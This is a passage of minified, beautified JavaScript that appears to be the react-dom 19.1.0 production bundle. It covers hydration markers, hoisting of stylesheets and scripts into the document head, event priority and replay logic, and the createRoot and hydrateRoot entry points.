          l === "$" || l === "$?" || l === "$!" ? n++ : a = l.charCodeAt(0) - 48;
      else
        a = 0;
      l = i
    } while (l);
    gi(e)
  }
  function ws(t) {
    var e = t.firstChild;
    for (e && e.nodeType === 10 && (e = e.nextSibling); e;) {
      var l = e;
      switch (e = e.nextSibling,
      l.nodeName) {
        case "HTML":
        case "HEAD":
        case "BODY":
          ws(l),
            ha(l);
          continue;
        case "SCRIPT":
        case "STYLE":
          continue;
        case "LINK":
          if (l.rel.toLowerCase() === "stylesheet")
            continue
      }
      t.removeChild(l)
    }
  }
  function xp(t, e, l, a) {
    for (; t.nodeType === 1;) {
      var n = l;
      if (t.nodeName.toLowerCase() !== e.toLowerCase()) {
        if (!a && (t.nodeName !== "INPUT" || t.type !== "hidden"))
          break
      } else if (a) {
        if (!t[Bl])
          switch (e) {
            case "meta":
              if (!t.hasAttribute("itemprop"))
                break;
              return t;
            case "link":
              if (i = t.getAttribute("rel"),
                i === "stylesheet" && t.hasAttribute("data-precedence"))
                break;
              if (i !== n.rel || t.getAttribute("href") !== (n.href == null || n.href === "" ? null : n.href) || t.getAttribute("crossorigin") !== (n.crossOrigin == null ? null : n.crossOrigin) || t.getAttribute("title") !== (n.title == null ? null : n.title))
                break;
              return t;
            case "style":
              if (t.hasAttribute("data-precedence"))
                break;
              return t;
            case "script":
              if (i = t.getAttribute("src"),
                (i !== (n.src == null ? null : n.src) || t.getAttribute("type") !== (n.type == null ? null : n.type) || t.getAttribute("crossorigin") !== (n.crossOrigin == null ? null : n.crossOrigin)) && i && t.hasAttribute("async") && !t.hasAttribute("itemprop"))
                break;
              return t;
            default:
              return t
          }
      } else if (e === "input" && t.type === "hidden") {
        var i = n.name == null ? null : "" + n.name;
        if (n.type === "hidden" && t.getAttribute("name") === i)
          return t
      } else
        return t;
      if (t = el(t.nextSibling),
        t === null)
        break
    }
    return null
  }
  function Sp(t, e, l) {
    if (e === "")
      return null;
    for (; t.nodeType !== 3;)
      if ((t.nodeType !== 1 || t.nodeName !== "INPUT" || t.type !== "hidden") && !l || (t = el(t.nextSibling),
        t === null))
        return null;
    return t
  }
  function Hs(t) {
    return t.data === "$!" || t.data === "$?" && t.ownerDocument.readyState === "complete"
  }
  function zp(t, e) {
    var l = t.ownerDocument;
    if (t.data !== "$?" || l.readyState === "complete")
      e();
    else {
      var a = function () {
        e(),
          l.removeEventListener("DOMContentLoaded", a)
      };
      l.addEventListener("DOMContentLoaded", a),
        t._reactRetry = a
    }
  }
  function el(t) {
    for (; t != null; t = t.nextSibling) {
      var e = t.nodeType;
      if (e === 1 || e === 3)
        break;
      if (e === 8) {
        if (e = t.data,
          e === "$" || e === "$!" || e === "$?" || e === "F!" || e === "F")
          break;
        if (e === "/$")
          return null
      }
    }
    return t
  }
  var qs = null;
  function Ed(t) {
    t = t.previousSibling;
    for (var e = 0; t;) {
      if (t.nodeType === 8) {
        var l = t.data;
        if (l === "$" || l === "$!" || l === "$?") {
          if (e === 0)
            return t;
          e--
        } else
          l === "/$" && e++
      }
      t = t.previousSibling
    }
    return null
  }
  function Ad(t, e, l) {
    switch (e = xu(l),
    t) {
      case "html":
        if (t = e.documentElement,
          !t)
          throw Error(r(452));
        return t;
      case "head":
        if (t = e.head,
          !t)
          throw Error(r(453));
        return t;
      case "body":
        if (t = e.body,
          !t)
          throw Error(r(454));
        return t;
      default:
        throw Error(r(451))
    }
  }
  function si(t) {
    for (var e = t.attributes; e.length;)
      t.removeAttributeNode(e[0]);
    ha(t)
  }
  var Je = new Map
    , Md = new Set;
  function Su(t) {
    return typeof t.getRootNode == "function" ? t.getRootNode() : t.nodeType === 9 ? t : t.ownerDocument
  }
  var jl = w.d;
  w.d = {
    f: Np,
    r: Tp,
    D: _p,
    C: Ep,
    L: Ap,
    m: Mp,
    X: Rp,
    S: Op,
    M: kp
  };
  function Np() {
    var t = jl.f()
      , e = du();
    return t || e
  }
  function Tp(t) {
    var e = Gl(t);
    e !== null && e.tag === 5 && e.type === "form" ? Ko(e) : jl.r(t)
  }
  var vn = typeof document > "u" ? null : document;
  function Od(t, e, l) {
    var a = vn;
    if (a && typeof e == "string" && e) {
      var n = Ge(e);
      n = 'link[rel="' + t + '"][href="' + n + '"]',
        typeof l == "string" && (n += '[crossorigin="' + l + '"]'),
        Md.has(n) || (Md.add(n),
          t = {
            rel: t,
            crossOrigin: l,
            href: e
          },
          a.querySelector(n) === null && (e = a.createElement("link"),
            pe(e, "link", t),
            H(e),
            a.head.appendChild(e)))
    }
  }
  function _p(t) {
    jl.D(t),
      Od("dns-prefetch", t, null)
  }
  function Ep(t, e) {
    jl.C(t, e),
      Od("preconnect", t, e)
  }
  function Ap(t, e, l) {
    jl.L(t, e, l);
    var a = vn;
    if (a && t && e) {
      var n = 'link[rel="preload"][as="' + Ge(e) + '"]';
      e === "image" && l && l.imageSrcSet ? (n += '[imagesrcset="' + Ge(l.imageSrcSet) + '"]',
        typeof l.imageSizes == "string" && (n += '[imagesizes="' + Ge(l.imageSizes) + '"]')) : n += '[href="' + Ge(t) + '"]';
      var i = n;
      switch (e) {
        case "style":
          i = bn(t);
          break;
        case "script":
          i = yn(t)
      }
      Je.has(i) || (t = C({
        rel: "preload",
        href: e === "image" && l && l.imageSrcSet ? void 0 : t,
        as: e
      }, l),
        Je.set(i, t),
        a.querySelector(n) !== null || e === "style" && a.querySelector(ri(i)) || e === "script" && a.querySelector(oi(i)) || (e = a.createElement("link"),
          pe(e, "link", t),
          H(e),
          a.head.appendChild(e)))
    }
  }
  function Mp(t, e) {
    jl.m(t, e);
    var l = vn;
    if (l && t) {
      var a = e && typeof e.as == "string" ? e.as : "script"
        , n = 'link[rel="modulepreload"][as="' + Ge(a) + '"][href="' + Ge(t) + '"]'
        , i = n;
      switch (a) {
        case "audioworklet":
        case "paintworklet":
        case "serviceworker":
        case "sharedworker":
        case "worker":
        case "script":
          i = yn(t)
      }
      if (!Je.has(i) && (t = C({
        rel: "modulepreload",
        href: t
      }, e),
        Je.set(i, t),
        l.querySelector(n) === null)) {
        switch (a) {
          case "audioworklet":
          case "paintworklet":
          case "serviceworker":
          case "sharedworker":
          case "worker":
          case "script":
            if (l.querySelector(oi(i)))
              return
        }
        a = l.createElement("link"),
          pe(a, "link", t),
          H(a),
          l.head.appendChild(a)
      }
    }
  }
  function Op(t, e, l) {
    jl.S(t, e, l);
    var a = vn;
    if (a && t) {
      var n = U(a).hoistableStyles
        , i = bn(t);
      e = e || "default";
      var u = n.get(i);
      if (!u) {
        var s = {
          loading: 0,
          preload: null
        };
        if (u = a.querySelector(ri(i)))
          s.loading = 5;
        else {
          t = C({
            rel: "stylesheet",
            href: t,
            "data-precedence": e
          }, l),
            (l = Je.get(i)) && Bs(t, l);
          var f = u = a.createElement("link");
          H(f),
            pe(f, "link", t),
            f._p = new Promise(function (x, _) {
              f.onload = x,
                f.onerror = _
            }
            ),
            f.addEventListener("load", function () {
              s.loading |= 1
            }),
            f.addEventListener("error", function () {
              s.loading |= 2
            }),
            s.loading |= 4,
            zu(u, e, a)
        }
        u = {
          type: "stylesheet",
          instance: u,
          count: 1,
          state: s
        },
          n.set(i, u)
      }
    }
  }
  function Rp(t, e) {
    jl.X(t, e);
    var l = vn;
    if (l && t) {
      var a = U(l).hoistableScripts
        , n = yn(t)
        , i = a.get(n);
      i || (i = l.querySelector(oi(n)),
        i || (t = C({
          src: t,
          async: !0
        }, e),
          (e = Je.get(n)) && Ys(t, e),
          i = l.createElement("script"),
          H(i),
          pe(i, "link", t),
          l.head.appendChild(i)),
        i = {
          type: "script",
          instance: i,
          count: 1,
          state: null
        },
        a.set(n, i))
    }
  }
  function kp(t, e) {
    jl.M(t, e);
    var l = vn;
    if (l && t) {
      var a = U(l).hoistableScripts
        , n = yn(t)
        , i = a.get(n);
      i || (i = l.querySelector(oi(n)),
        i || (t = C({
          src: t,
          async: !0,
          type: "module"
        }, e),
          (e = Je.get(n)) && Ys(t, e),
          i = l.createElement("script"),
          H(i),
          pe(i, "link", t),
          l.head.appendChild(i)),
        i = {
          type: "script",
          instance: i,
          count: 1,
          state: null
        },
        a.set(n, i))
    }
  }
  function Rd(t, e, l, a) {
    var n = (n = V.current) ? Su(n) : null;
    if (!n)
      throw Error(r(446));
    switch (t) {
      case "meta":
      case "title":
        return null;
      case "style":
        return typeof l.precedence == "string" && typeof l.href == "string" ? (e = bn(l.href),
          l = U(n).hoistableStyles,
          a = l.get(e),
          a || (a = {
            type: "style",
            instance: null,
            count: 0,
            state: null
          },
            l.set(e, a)),
          a) : {
          type: "void",
          instance: null,
          count: 0,
          state: null
        };
      case "link":
        if (l.rel === "stylesheet" && typeof l.href == "string" && typeof l.precedence == "string") {
          t = bn(l.href);
          var i = U(n).hoistableStyles
            , u = i.get(t);
          if (u || (n = n.ownerDocument || n,
            u = {
              type: "stylesheet",
              instance: null,
              count: 0,
              state: {
                loading: 0,
                preload: null
              }
            },
            i.set(t, u),
            (i = n.querySelector(ri(t))) && !i._p && (u.instance = i,
              u.state.loading = 5),
            Je.has(t) || (l = {
              rel: "preload",
              as: "style",
              href: l.href,
              crossOrigin: l.crossOrigin,
              integrity: l.integrity,
              media: l.media,
              hrefLang: l.hrefLang,
              referrerPolicy: l.referrerPolicy
            },
              Je.set(t, l),
              i || jp(n, t, l, u.state))),
            e && a === null)
            throw Error(r(528, ""));
          return u
        }
        if (e && a !== null)
          throw Error(r(529, ""));
        return null;
      case "script":
        return e = l.async,
          l = l.src,
          typeof l == "string" && e && typeof e != "function" && typeof e != "symbol" ? (e = yn(l),
            l = U(n).hoistableScripts,
            a = l.get(e),
            a || (a = {
              type: "script",
              instance: null,
              count: 0,
              state: null
            },
              l.set(e, a)),
            a) : {
            type: "void",
            instance: null,
            count: 0,
            state: null
          };
      default:
        throw Error(r(444, t))
    }
  }
  function bn(t) {
    return 'href="' + Ge(t) + '"'
  }
  function ri(t) {
    return 'link[rel="stylesheet"][' + t + "]"
  }
  function kd(t) {
    return C({}, t, {
      "data-precedence": t.precedence,
      precedence: null
    })
  }
  function jp(t, e, l, a) {
    t.querySelector('link[rel="preload"][as="style"][' + e + "]") ? a.loading = 1 : (e = t.createElement("link"),
      a.preload = e,
      e.addEventListener("load", function () {
        return a.loading |= 1
      }),
      e.addEventListener("error", function () {
        return a.loading |= 2
      }),
      pe(e, "link", l),
      H(e),
      t.head.appendChild(e))
  }
  function yn(t) {
    return '[src="' + Ge(t) + '"]'
  }
  function oi(t) {
    return "script[async]" + t
  }
  function jd(t, e, l) {
    if (e.count++,
      e.instance === null)
      switch (e.type) {
        case "style":
          var a = t.querySelector('style[data-href~="' + Ge(l.href) + '"]');
          if (a)
            return e.instance = a,
              H(a),
              a;
          var n = C({}, l, {
            "data-href": l.href,
            "data-precedence": l.precedence,
            href: null,
            precedence: null
          });
          return a = (t.ownerDocument || t).createElement("style"),
            H(a),
            pe(a, "style", n),
            zu(a, l.precedence, t),
            e.instance = a;
        case "stylesheet":
          n = bn(l.href);
          var i = t.querySelector(ri(n));
          if (i)
            return e.state.loading |= 4,
              e.instance = i,
              H(i),
              i;
          a = kd(l),
            (n = Je.get(n)) && Bs(a, n),
            i = (t.ownerDocument || t).createElement("link"),
            H(i);
          var u = i;
          return u._p = new Promise(function (s, f) {
            u.onload = s,
              u.onerror = f
          }
          ),
            pe(i, "link", a),
            e.state.loading |= 4,
            zu(i, l.precedence, t),
            e.instance = i;
        case "script":
          return i = yn(l.src),
            (n = t.querySelector(oi(i))) ? (e.instance = n,
              H(n),
              n) : (a = l,
                (n = Je.get(i)) && (a = C({}, l),
                  Ys(a, n)),
                t = t.ownerDocument || t,
                n = t.createElement("script"),
                H(n),
                pe(n, "link", a),
                t.head.appendChild(n),
                e.instance = n);
        case "void":
          return null;
        default:
          throw Error(r(443, e.type))
      }
    else
      e.type === "stylesheet" && (e.state.loading & 4) === 0 && (a = e.instance,
        e.state.loading |= 4,
        zu(a, l.precedence, t));
    return e.instance
  }
  function zu(t, e, l) {
    for (var a = l.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'), n = a.length ? a[a.length - 1] : null, i = n, u = 0; u < a.length; u++) {
      var s = a[u];
      if (s.dataset.precedence === e)
        i = s;
      else if (i !== n)
        break
    }
    i ? i.parentNode.insertBefore(t, i.nextSibling) : (e = l.nodeType === 9 ? l.head : l,
      e.insertBefore(t, e.firstChild))
  }
  function Bs(t, e) {
    t.crossOrigin == null && (t.crossOrigin = e.crossOrigin),
      t.referrerPolicy == null && (t.referrerPolicy = e.referrerPolicy),
      t.title == null && (t.title = e.title)
  }
  function Ys(t, e) {
    t.crossOrigin == null && (t.crossOrigin = e.crossOrigin),
      t.referrerPolicy == null && (t.referrerPolicy = e.referrerPolicy),
      t.integrity == null && (t.integrity = e.integrity)
  }
  var Nu = null;
  function Dd(t, e, l) {
    if (Nu === null) {
      var a = new Map
        , n = Nu = new Map;
      n.set(l, a)
    } else
      n = Nu,
        a = n.get(l),
        a || (a = new Map,
          n.set(l, a));
    if (a.has(t))
      return a;
    for (a.set(t, null),
      l = l.getElementsByTagName(t),
      n = 0; n < l.length; n++) {
      var i = l[n];
      if (!(i[Bl] || i[ie] || t === "link" && i.getAttribute("rel") === "stylesheet") && i.namespaceURI !== "http://www.w3.org/2000/svg") {
        var u = i.getAttribute(e) || "";
        u = t + u;
        var s = a.get(u);
        s ? s.push(i) : a.set(u, [i])
      }
    }
    return a
  }
  function Cd(t, e, l) {
    t = t.ownerDocument || t,
      t.head.insertBefore(l, e === "title" ? t.querySelector("head > title") : null)
  }
  function Dp(t, e, l) {
    if (l === 1 || e.itemProp != null)
      return !1;
    switch (t) {
      case "meta":
      case "title":
        return !0;
      case "style":
        if (typeof e.precedence != "string" || typeof e.href != "string" || e.href === "")
          break;
        return !0;
      case "link":
        if (typeof e.rel != "string" || typeof e.href != "string" || e.href === "" || e.onLoad || e.onError)
          break;
        return e.rel === "stylesheet" ? (t = e.disabled,
          typeof e.precedence == "string" && t == null) : !0;
      case "script":
        if (e.async && typeof e.async != "function" && typeof e.async != "symbol" && !e.onLoad && !e.onError && e.src && typeof e.src == "string")
          return !0
    }
    return !1
  }
  function Ud(t) {
    return !(t.type === "stylesheet" && (t.state.loading & 3) === 0)
  }
  var fi = null;
  function Cp() { }
  function Up(t, e, l) {
    if (fi === null)
      throw Error(r(475));
    var a = fi;
    if (e.type === "stylesheet" && (typeof l.media != "string" || matchMedia(l.media).matches !== !1) && (e.state.loading & 4) === 0) {
      if (e.instance === null) {
        var n = bn(l.href)
          , i = t.querySelector(ri(n));
        if (i) {
          t = i._p,
            t !== null && typeof t == "object" && typeof t.then == "function" && (a.count++,
              a = Tu.bind(a),
              t.then(a, a)),
            e.state.loading |= 4,
            e.instance = i,
            H(i);
          return
        }
        i = t.ownerDocument || t,
          l = kd(l),
          (n = Je.get(n)) && Bs(l, n),
          i = i.createElement("link"),
          H(i);
        var u = i;
        u._p = new Promise(function (s, f) {
          u.onload = s,
            u.onerror = f
        }
        ),
          pe(i, "link", l),
          e.instance = i
      }
      a.stylesheets === null && (a.stylesheets = new Map),
        a.stylesheets.set(e, t),
        (t = e.state.preload) && (e.state.loading & 3) === 0 && (a.count++,
          e = Tu.bind(a),
          t.addEventListener("load", e),
          t.addEventListener("error", e))
    }
  }
  function wp() {
    if (fi === null)
      throw Error(r(475));
    var t = fi;
    return t.stylesheets && t.count === 0 && Gs(t, t.stylesheets),
      0 < t.count ? function (e) {
        var l = setTimeout(function () {
          if (t.stylesheets && Gs(t, t.stylesheets),
            t.unsuspend) {
            var a = t.unsuspend;
            t.unsuspend = null,
              a()
          }
        }, 6e4);
        return t.unsuspend = e,
          function () {
            t.unsuspend = null,
              clearTimeout(l)
          }
      }
        : null
  }
  function Tu() {
    if (this.count--,
      this.count === 0) {
      if (this.stylesheets)
        Gs(this, this.stylesheets);
      else if (this.unsuspend) {
        var t = this.unsuspend;
        this.unsuspend = null,
          t()
      }
    }
  }
  var _u = null;
  function Gs(t, e) {
    t.stylesheets = null,
      t.unsuspend !== null && (t.count++,
        _u = new Map,
        e.forEach(Hp, t),
        _u = null,
        Tu.call(t))
  }
  function Hp(t, e) {
    if (!(e.state.loading & 4)) {
      var l = _u.get(t);
      if (l)
        var a = l.get(null);
      else {
        l = new Map,
          _u.set(t, l);
        for (var n = t.querySelectorAll("link[data-precedence],style[data-precedence]"), i = 0; i < n.length; i++) {
          var u = n[i];
          (u.nodeName === "LINK" || u.getAttribute("media") !== "not all") && (l.set(u.dataset.precedence, u),
            a = u)
        }
        a && l.set(null, a)
      }
      n = e.instance,
        u = n.getAttribute("data-precedence"),
        i = l.get(u) || a,
        i === a && l.set(null, n),
        l.set(u, n),
        this.count++,
        a = Tu.bind(this),
        n.addEventListener("load", a),
        n.addEventListener("error", a),
        i ? i.parentNode.insertBefore(n, i.nextSibling) : (t = t.nodeType === 9 ? t.head : t,
          t.insertBefore(n, t.firstChild)),
        e.state.loading |= 4
    }
  }
  var di = {
    $$typeof: Gt,
    Provider: null,
    Consumer: null,
    _currentValue: W,
    _currentValue2: W,
    _threadCount: 0
  };
  function qp(t, e, l, a, n, i, u, s) {
    this.tag = 1,
      this.containerInfo = t,
      this.pingCache = this.current = this.pendingChildren = null,
      this.timeoutHandle = -1,
      this.callbackNode = this.next = this.pendingContext = this.context = this.cancelPendingCommit = null,
      this.callbackPriority = 0,
      this.expirationTimes = zn(-1),
      this.entangledLanes = this.shellSuspendCounter = this.errorRecoveryDisabledLanes = this.expiredLanes = this.warmLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0,
      this.entanglements = zn(0),
      this.hiddenUpdates = zn(null),
      this.identifierPrefix = a,
      this.onUncaughtError = n,
      this.onCaughtError = i,
      this.onRecoverableError = u,
      this.pooledCache = null,
      this.pooledCacheLanes = 0,
      this.formState = s,
      this.incompleteTransitions = new Map
  }
  function wd(t, e, l, a, n, i, u, s, f, x, _, M) {
    return t = new qp(t, e, l, u, s, f, x, M),
      e = 1,
      i === !0 && (e |= 24),
      i = Ce(3, null, null, e),
      t.current = i,
      i.stateNode = t,
      e = zc(),
      e.refCount++,
      t.pooledCache = e,
      e.refCount++,
      i.memoizedState = {
        element: a,
        isDehydrated: l,
        cache: e
      },
      Ec(i),
      t
  }
  function Hd(t) {
    return t ? (t = $a,
      t) : $a
  }
  function qd(t, e, l, a, n, i) {
    n = Hd(n),
      a.context === null ? a.context = n : a.pendingContext = n,
      a = Zl(e),
      a.payload = {
        element: l
      },
      i = i === void 0 ? null : i,
      i !== null && (a.callback = i),
      l = Vl(t, a, e),
      l !== null && (Be(l, t, e),
        Xn(l, t, e))
  }
  function Bd(t, e) {
    if (t = t.memoizedState,
      t !== null && t.dehydrated !== null) {
      var l = t.retryLane;
      t.retryLane = l !== 0 && l < e ? l : e
    }
  }
  function Xs(t, e) {
    Bd(t, e),
      (t = t.alternate) && Bd(t, e)
  }
  function Yd(t) {
    if (t.tag === 13) {
      var e = Ja(t, 67108864);
      e !== null && Be(e, t, 67108864),
        Xs(t, 67108864)
    }
  }
  var Eu = !0;
  function Bp(t, e, l, a) {
    var n = T.T;
    T.T = null;
    var i = w.p;
    try {
      w.p = 2,
        Qs(t, e, l, a)
    } finally {
      w.p = i,
        T.T = n
    }
  }
  function Yp(t, e, l, a) {
    var n = T.T;
    T.T = null;
    var i = w.p;
    try {
      w.p = 8,
        Qs(t, e, l, a)
    } finally {
      w.p = i,
        T.T = n
    }
  }
  function Qs(t, e, l, a) {
    if (Eu) {
      var n = Ls(a);
      if (n === null)
        Rs(t, e, a, Au, l),
          Xd(t, a);
      else if (Xp(n, t, e, l, a))
        a.stopPropagation();
      else if (Xd(t, a),
        e & 4 && -1 < Gp.indexOf(t)) {
        for (; n !== null;) {
          var i = Gl(n);
          if (i !== null)
            switch (i.tag) {
              case 3:
                if (i = i.stateNode,
                  i.current.memoizedState.isDehydrated) {
                  var u = ul(i.pendingLanes);
                  if (u !== 0) {
                    var s = i;
                    for (s.pendingLanes |= 2,
                      s.entangledLanes |= 2; u;) {
                      var f = 1 << 31 - fe(u);
                      s.entanglements[1] |= f,
                        u &= ~f
                    }
                    ml(i),
                      (kt & 6) === 0 && (ou = Ee() + 500,
                        ii(0))
                  }
                }
                break;
              case 13:
                s = Ja(i, 2),
                  s !== null && Be(s, i, 2),
                  du(),
                  Xs(i, 2)
            }
          if (i = Ls(a),
            i === null && Rs(t, e, a, Au, l),
            i === n)
            break;
          n = i
        }
        n !== null && a.stopPropagation()
      } else
        Rs(t, e, a, null, l)
    }
  }
  function Ls(t) {
    return t = $u(t),
      Zs(t)
  }
  var Au = null;
  function Zs(t) {
    if (Au = null,
      t = Yl(t),
      t !== null) {
      var e = R(t);
      if (e === null)
        t = null;
      else {
        var l = e.tag;
        if (l === 13) {
          if (t = A(e),
            t !== null)
            return t;
          t = null
        } else if (l === 3) {
          if (e.stateNode.current.memoizedState.isDehydrated)
            return e.tag === 3 ? e.stateNode.containerInfo : null;
          t = null
        } else
          e !== t && (t = null)
      }
    }
    return Au = t,
      null
  }
  function Gd(t) {
    switch (t) {
      case "beforetoggle":
      case "cancel":
      case "click":
      case "close":
      case "contextmenu":
      case "copy":
      case "cut":
      case "auxclick":
      case "dblclick":
      case "dragend":
      case "dragstart":
      case "drop":
      case "focusin":
      case "focusout":
      case "input":
      case "invalid":
      case "keydown":
      case "keypress":
      case "keyup":
      case "mousedown":
      case "mouseup":
      case "paste":
      case "pause":
      case "play":
      case "pointercancel":
      case "pointerdown":
      case "pointerup":
      case "ratechange":
      case "reset":
      case "resize":
      case "seeked":
      case "submit":
      case "toggle":
      case "touchcancel":
      case "touchend":
      case "touchstart":
      case "volumechange":
      case "change":
      case "selectionchange":
      case "textInput":
      case "compositionstart":
      case "compositionend":
      case "compositionupdate":
      case "beforeblur":
      case "afterblur":
      case "beforeinput":
      case "blur":
      case "fullscreenchange":
      case "focus":
      case "hashchange":
      case "popstate":
      case "select":
      case "selectstart":
        return 2;
      case "drag":
      case "dragenter":
      case "dragexit":
      case "dragleave":
      case "dragover":
      case "mousemove":
      case "mouseout":
      case "mouseover":
      case "pointermove":
      case "pointerout":
      case "pointerover":
      case "scroll":
      case "touchmove":
      case "wheel":
      case "mouseenter":
      case "mouseleave":
      case "pointerenter":
      case "pointerleave":
        return 8;
      case "message":
        switch (Ca()) {
          case gl:
            return 2;
          case al:
            return 8;
          case Fe:
          case oe:
            return 32;
          case Ua:
            return 268435456;
          default:
            return 32
        }
      default:
        return 32
    }
  }
  var Vs = !1
    , ia = null
    , ua = null
    , ca = null
    , mi = new Map
    , pi = new Map
    , sa = []
    , Gp = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");
  function Xd(t, e) {
    switch (t) {
      case "focusin":
      case "focusout":
        ia = null;
        break;
      case "dragenter":
      case "dragleave":
        ua = null;
        break;
      case "mouseover":
      case "mouseout":
        ca = null;
        break;
      case "pointerover":
      case "pointerout":
        mi.delete(e.pointerId);
        break;
      case "gotpointercapture":
      case "lostpointercapture":
        pi.delete(e.pointerId)
    }
  }
  function hi(t, e, l, a, n, i) {
    return t === null || t.nativeEvent !== i ? (t = {
      blockedOn: e,
      domEventName: l,
      eventSystemFlags: a,
      nativeEvent: i,
      targetContainers: [n]
    },
      e !== null && (e = Gl(e),
        e !== null && Yd(e)),
      t) : (t.eventSystemFlags |= a,
        e = t.targetContainers,
        n !== null && e.indexOf(n) === -1 && e.push(n),
        t)
  }
  function Xp(t, e, l, a, n) {
    switch (e) {
      case "focusin":
        return ia = hi(ia, t, e, l, a, n),
          !0;
      case "dragenter":
        return ua = hi(ua, t, e, l, a, n),
          !0;
      case "mouseover":
        return ca = hi(ca, t, e, l, a, n),
          !0;
      case "pointerover":
        var i = n.pointerId;
        return mi.set(i, hi(mi.get(i) || null, t, e, l, a, n)),
          !0;
      case "gotpointercapture":
        return i = n.pointerId,
          pi.set(i, hi(pi.get(i) || null, t, e, l, a, n)),
          !0
    }
    return !1
  }
  function Qd(t) {
    var e = Yl(t.target);
    if (e !== null) {
      var l = R(e);
      if (l !== null) {
        if (e = l.tag,
          e === 13) {
          if (e = A(l),
            e !== null) {
            t.blockedOn = e,
              Ba(t.priority, function () {
                if (l.tag === 13) {
                  var a = qe();
                  a = Hl(a);
                  var n = Ja(l, a);
                  n !== null && Be(n, l, a),
                    Xs(l, a)
                }
              });
            return
          }
        } else if (e === 3 && l.stateNode.current.memoizedState.isDehydrated) {
          t.blockedOn = l.tag === 3 ? l.stateNode.containerInfo : null;
          return
        }
      }
    }
    t.blockedOn = null
  }
  function Mu(t) {
    if (t.blockedOn !== null)
      return !1;
    for (var e = t.targetContainers; 0 < e.length;) {
      var l = Ls(t.nativeEvent);
      if (l === null) {
        l = t.nativeEvent;
        var a = new l.constructor(l.type, l);
        Ju = a,
          l.target.dispatchEvent(a),
          Ju = null
      } else
        return e = Gl(l),
          e !== null && Yd(e),
          t.blockedOn = l,
          !1;
      e.shift()
    }
    return !0
  }
  function Ld(t, e, l) {
    Mu(t) && l.delete(e)
  }
  function Qp() {
    Vs = !1,
      ia !== null && Mu(ia) && (ia = null),
      ua !== null && Mu(ua) && (ua = null),
      ca !== null && Mu(ca) && (ca = null),
      mi.forEach(Ld),
      pi.forEach(Ld)
  }
  function Ou(t, e) {
    t.blockedOn === e && (t.blockedOn = null,
      Vs || (Vs = !0,
        c.unstable_scheduleCallback(c.unstable_NormalPriority, Qp)))
  }
  var Ru = null;
  function Zd(t) {
    Ru !== t && (Ru = t,
      c.unstable_scheduleCallback(c.unstable_NormalPriority, function () {
        Ru === t && (Ru = null);
        for (var e = 0; e < t.length; e += 3) {
          var l = t[e]
            , a = t[e + 1]
            , n = t[e + 2];
          if (typeof a != "function") {
            if (Zs(a || l) === null)
              continue;
            break
          }
          var i = Gl(l);
          i !== null && (t.splice(e, 3),
            e -= 3,
            Zc(i, {
              pending: !0,
              data: n,
              method: l.method,
              action: a
            }, a, n))
        }
      }))
  }
  function gi(t) {
    function e(f) {
      return Ou(f, t)
    }
    ia !== null && Ou(ia, t),
      ua !== null && Ou(ua, t),
      ca !== null && Ou(ca, t),
      mi.forEach(e),
      pi.forEach(e);
    for (var l = 0; l < sa.length; l++) {
      var a = sa[l];
      a.blockedOn === t && (a.blockedOn = null)
    }
    for (; 0 < sa.length && (l = sa[0],
      l.blockedOn === null);)
      Qd(l),
        l.blockedOn === null && sa.shift();
    if (l = (t.ownerDocument || t).$$reactFormReplay,
      l != null)
      for (a = 0; a < l.length; a += 3) {
        var n = l[a]
          , i = l[a + 1]
          , u = n[ge] || null;
        if (typeof i == "function")
          u || Zd(l);
        else if (u) {
          var s = null;
          if (i && i.hasAttribute("formAction")) {
            if (n = i,
              u = i[ge] || null)
              s = u.formAction;
            else if (Zs(n) !== null)
              continue
          } else
            s = u.action;
          typeof s == "function" ? l[a + 1] = s : (l.splice(a, 3),
            a -= 3),
            Zd(l)
        }
      }
  }
  function Ks(t) {
    this._internalRoot = t
  }
  ku.prototype.render = Ks.prototype.render = function (t) {
    var e = this._internalRoot;
    if (e === null)
      throw Error(r(409));
    var l = e.current
      , a = qe();
    qd(l, a, t, e, null, null)
  }
    ,
    ku.prototype.unmount = Ks.prototype.unmount = function () {
      var t = this._internalRoot;
      if (t !== null) {
        this._internalRoot = null;
        var e = t.containerInfo;
        qd(t.current, 2, null, t, null, null),
          du(),
          e[ql] = null
      }
    }
    ;
  function ku(t) {
    this._internalRoot = t
  }
  ku.prototype.unstable_scheduleHydration = function (t) {
    if (t) {
      var e = Ni();
      t = {
        blockedOn: null,
        target: t,
        priority: e
      };
      for (var l = 0; l < sa.length && e !== 0 && e < sa[l].priority; l++)
        ;
      sa.splice(l, 0, t),
        l === 0 && Qd(t)
    }
  }
    ;
  var Vd = p.version;
  if (Vd !== "19.1.0")
    throw Error(r(527, Vd, "19.1.0"));
  w.findDOMNode = function (t) {
    var e = t._reactInternals;
    if (e === void 0)
      throw typeof t.render == "function" ? Error(r(188)) : (t = Object.keys(t).join(","),
        Error(r(268, t)));
    return t = k(e),
      t = t !== null ? y(t) : null,
      t = t === null ? null : t.stateNode,
      t
  }
    ;
  var Lp = {
    bundleType: 0,
    version: "19.1.0",
    rendererPackageName: "react-dom",
    currentDispatcherRef: T,
    reconcilerVersion: "19.1.0"
  };
  if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var ju = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!ju.isDisabled && ju.supportsFiber)
      try {
        vl = ju.inject(Lp),
          ze = ju
      } catch { }
  }
  return bi.createRoot = function (t, e) {
    if (!S(t))
      throw Error(r(299));
    var l = !1
      , a = ""
      , n = sf
      , i = rf
      , u = of
      , s = null;
    return e != null && (e.unstable_strictMode === !0 && (l = !0),
      e.identifierPrefix !== void 0 && (a = e.identifierPrefix),
      e.onUncaughtError !== void 0 && (n = e.onUncaughtError),
      e.onCaughtError !== void 0 && (i = e.onCaughtError),
      e.onRecoverableError !== void 0 && (u = e.onRecoverableError),
      e.unstable_transitionCallbacks !== void 0 && (s = e.unstable_transitionCallbacks)),
      e = wd(t, 1, !1, null, null, l, a, n, i, u, s, null),
      t[ql] = e.current,
      Os(t),
      new Ks(e)
  }
    ,
    bi.hydrateRoot = function (t, e, l) {
      if (!S(t))
        throw Error(r(299));
      var a = !1
        , n = ""
        , i = sf
        , u = rf
        , s = of
        , f = null
        , x = null;
      return l != null && (l.unstable_strictMode === !0 && (a = !0),
        l.identifierPrefix !== void 0 && (n = l.identifierPrefix),
